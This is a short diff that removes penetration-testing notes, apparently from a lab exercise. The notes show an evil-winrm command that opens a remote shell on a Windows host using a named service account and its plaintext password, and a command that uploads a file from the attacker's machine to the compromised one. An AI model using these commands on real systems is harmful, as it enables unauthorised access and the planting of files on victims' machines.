@@ -1,5 +1,0 @@
-#establish a session
-    - evil-winrm -i 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
-================================================================================
-#upload file from local attack machine to compromised machine (running session)
-    - upload /home/kimkhuongduy/Desktop/file.file C:\Users\svc-alfresco\Documents
